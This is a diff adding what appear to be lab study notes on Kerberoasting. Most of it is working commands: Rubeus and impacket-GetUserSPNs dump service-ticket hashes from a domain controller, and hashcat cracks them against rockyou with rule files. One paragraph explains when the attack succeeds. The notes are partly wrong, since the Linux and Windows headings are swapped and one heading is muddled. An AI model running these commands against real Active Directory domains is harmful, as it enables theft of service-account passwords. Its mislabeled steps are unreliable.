@@ -1,0 +1,35 @@
+Kerberoasting
+##KERBEROASTING ON LINUX
+GET tgs-rEP HASH FROM AS -REP
+
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+
+cat hashes.kerberoast
+
+hashcat --help | grep -i "Kerberos"       
+
+sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+ 
+ 
+##KERBEROASTING ON WINDOWS
+sudo impacket-GetUserSPNs -request -dc-ip 192.168.219.70 corp.com/pete
+ 
+sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+
+
+
+This technique is immensely powerful if the domain contains high-privilege service accounts with weak passwords, which is not uncommon in many organizations. However, if the SPN runs in the context of a computer account, a managed service account,5 or a group-managed service account,6 the password will be randomly generated, complex, and 120 characters long, making cracking infeasible. The same is true for the krbtgt user account which acts as service account for the KDC. Therefore, our chances of performing a successful Kerberoast attack against SPNs running in the context of user accounts is much higher.
+
+sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+
+
+
+sudo hashcat -m 13100 hehe /usr/share/wordlists/rockyou.txt -r plus_one_rule --force
+
+nano plus_one_rule
+$1
+
+hashcat --stdout -a 0 -m 0 /usr/share/wordlists/rockyou.txt -r plus_one_rule | head -10
+
